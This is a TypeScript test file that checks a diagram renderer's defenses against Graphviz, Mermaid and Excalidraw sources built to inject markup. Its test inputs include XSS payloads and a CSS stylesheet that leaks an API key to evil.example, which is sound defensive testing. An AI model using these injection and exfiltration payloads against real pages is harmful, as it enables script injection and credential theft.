import { instance } from '@viz-js/viz'
import { describe, expect, it } from 'vitest'
import { geometryToSvg } from '../geometry'
import { parseExcalidraw } from '../excalidraw'
import { dotSourceIssue, MERMAID_SECURE_KEYS, prepareMermaid } from '../renderInput'
import { sanitizeSvg } from '../sanitizeSvg'

/**
 * The real renderer, against the real attack: a DOT source is data — it comes
 * in a bundle, a demo, an import, or from the model — and Graphviz turns
 * `URL="javascript:…"` into a link, and writes `fontname` into the picture
 * without escaping it. This asserts on what Graphviz actually emits, so the
 * test still means something if Graphviz changes how it writes either.
 *
 * (`features/diagrams/render.ts` checks the source with `renderInput.ts`, puts
 * every picture through `sanitizeSvg` and the views draw it as an image;
 * Mermaid's path needs a `document`, so the pieces are put together here.)
 */
const render = async (dot: string) => (await instance() as { renderString(s: string, o?: object): string }).renderString(dot, { format: 'svg' })

describe('a diagram that tries to smuggle script through the renderer', () => {
  it('Graphviz does emit the javascript: link — and sanitizing takes it out while the picture stays', async () => {
    const svg = await render('digraph { a [URL="javascript:alert(document.domain)" label="click me"]; b [URL="https://example.com/ok" label="ok"]; a -> b }')
    // The renderer's own output is the thing we cannot trust.
    expect(svg).toContain('javascript:alert(document.domain)')

    const out = sanitizeSvg(svg)
    expect(out.refused).toBe(false)
    expect(out.svg).not.toContain('javascript:')
    // The diagram is still a diagram: both nodes, their labels, and the link that was fine.
    expect(out.svg).toContain('click me')
    expect(out.svg).toContain('https://example.com/ok')
    expect(out.svg).toContain('</svg>')
  }, 30_000)

  it('a label full of markup comes through as text, because Graphviz escapes it and sanitizing leaves it alone', async () => {
    const svg = await render('digraph { n [label="</text><script>alert(1)</script>"] }')
    const out = sanitizeSvg(svg)
    expect(out.refused).toBe(false)
    expect(out.svg).not.toMatch(/<\s*script/i)
    expect(out.svg).toContain('&lt;script&gt;')
  }, 30_000)
})

/** What a page-wide stylesheet in a picture was for: read the API key field a character at a time, and tell another server. */
const LEAK = `<style>body{display:none} input[value^='sk-ant-a']{background:url(https://evil.example/a)}</style><image href="https://evil.example/i"/>`
/** What must not be in a picture that is drawn: a stylesheet that loads, an image from elsewhere, anything from the attacker's host. */
const leaked = (svg: string) => /evil\.example|<image|<style[^>]*>[^<]*body\{/i.test(svg)

describe('a diagram that tries to write markup of its own through the renderer', () => {
  const dotFonts = [
    `digraph { n [fontname="x\\"/>${LEAK.replace(/"/g, '\\"')}<x y=\\"" label="n"] }`,
    `digraph { node [fontname="x\\"/>${LEAK.replace(/"/g, '\\"')}<x y=\\""]; n }`,
    `digraph { n [label=<<FONT FACE="x&quot;/&gt;&lt;style&gt;body{display:none}&lt;/style&gt;">n</FONT>>] }`,
    `digraph { stylesheet="x\\"?><style>body{display:none}</style><?y \\""; n }`,
    `digraph { a -> b [headlabel="h" labelfontname="x\\"/>${LEAK.replace(/"/g, '\\"')}<x y=\\""] }`,
  ]

  it('Graphviz does write a font name into the picture as markup — and the source is refused before it renders', async () => {
    const svg = await render(dotFonts[0])
    // The renderer's own output carries the attacker's stylesheet and image.
    expect(svg).toContain("input[value^='sk-ant-a']")
    for (const src of dotFonts) expect(dotSourceIssue(src), src).toMatch(/not being rendered/)
  }, 30_000)

  it('and if one got past the check, the rebuilt picture has no stylesheet that loads and no image from elsewhere', async () => {
    for (const src of dotFonts) {
      const out = sanitizeSvg(await render(src))
      expect(leaked(out.svg), src).toBe(false)
    }
  }, 30_000)

  it('an ordinary font is still a font', async () => {
    const src = 'digraph { node [fontname="Helvetica,Arial,sans-serif"]; m; n [label=<<FONT FACE="Courier New">n</FONT>>] }'
    expect(dotSourceIssue(src)).toBeNull()
    const out = sanitizeSvg(await render(src))
    expect(out.refused).toBe(false)
    expect(out.svg).toContain('font-family="Helvetica,Arial,sans-serif"')
    expect(out.svg).toContain('font-family="Courier New"')
  }, 30_000)

  it('an Excalidraw drawing whose numbers are markup is drawn with numbers', () => {
    const file = {
      type: 'excalidraw',
      elements: [
        { id: 'a', type: 'rectangle', x: 0, y: 0, width: 100, height: 50, strokeWidth: `1"/>${LEAK}<x y="`, boundElements: [{ id: 't', type: 'text' }] },
        { id: 't', type: 'text', x: 10, y: 10, width: 10, height: 10, text: 'A', containerId: 'a', fontSize: `16"/>${LEAK}<x y="` },
        { id: 'b', type: 'ellipse', x: `200"/>${LEAK}<x y="`, y: 0, width: 80, height: 80 },
        { id: 'e', type: 'arrow', x: 100, y: 25, width: 100, height: 0, points: [[0, 0], [`50"/>${LEAK}`, 0], [100, 0]], startBinding: { elementId: 'a' }, endBinding: { elementId: 'b' } },
      ],
    }
    const d = parseExcalidraw(JSON.stringify(file))
    const svg = geometryToSvg(d.geometry!, { nodes: { a: 'A' } })
    expect(leaked(svg)).toBe(false)
    expect(svg).not.toContain('<x y=')
    expect(d.geometry!.nodes.b.x).toBe(40) // x became 0; the centre is half the width in
    expect(d.geometry!.nodes.a.strokeWidth).toBeUndefined()
    expect(d.geometry!.edges.e.points).toHaveLength(2)
  })
})

describe('a Mermaid source that would fetch or style the page while it renders', () => {
  it('loses its directives — the diagram stays', () => {
    const src = `%%{init: {"themeCSS": ".node{background:url(https://evil.example/a)}"}}%%\nflowchart LR\n  A --> B`
    const ready = prepareMermaid(src.replace('url(https://evil.example/a)', 'red'))
    expect(ready.refused).toBeUndefined()
    expect(ready.source).not.toMatch(/%%\{/)
    expect(ready.source).toContain('A --> B')
    expect(prepareMermaid('%%{ config: { "theme": "dark" } }%%\nflowchart LR\n A').source).not.toContain('config')
    // The CSS went with the directive it was in.
    expect(prepareMermaid(src)).toEqual({ source: '\nflowchart LR\n  A --> B' })
  })

  it('refuses an image shape, which Mermaid fetches during layout', () => {
    for (const src of ['flowchart TD\n  A@{ img: "https://evil.example/?d=secret", label: "x", pos: "t" }', "flowchart TD\n  A@{ shape: rect, 'img': 'https://evil.example/i' }"]) expect(prepareMermaid(src).refused, src).toMatch(/image shape/)
    expect(prepareMermaid('flowchart TD\n  A@{ shape: rect, label: "img: a value, not a key" }').refused).toBeUndefined()
  })

  it('refuses a style that loads something, however it is escaped', () => {
    for (const src of ['flowchart LR\n A\n classDef c fill:url(https://evil.example/x)', 'flowchart LR\n A\n style A fill:\\75 rl(https://evil.example/x)', 'flowchart LR\n A\n style A background:image-set("https://evil.example/x" 1x)', '---\nconfig:\n  themeCSS: "@import \'https://evil.example/a.css\';"\n---\nflowchart LR\n A'])
      expect(prepareMermaid(src).refused, src).toMatch(/loads something/)
    expect(prepareMermaid('flowchart LR\n A --> B\n classDef c fill:#f9f,stroke:#333\n linkStyle 0 stroke:red').refused).toBeUndefined()
  })

  it('keeps every setting that is CSS or decides what is HTML out of a diagram’s reach', () => {
    expect(MERMAID_SECURE_KEYS).toEqual(expect.arrayContaining(['secure', 'securityLevel', 'themeCSS', 'themeVariables', 'fontFamily', 'altFontFamily', 'dompurifyConfig', 'htmlLabels']))
  })
})
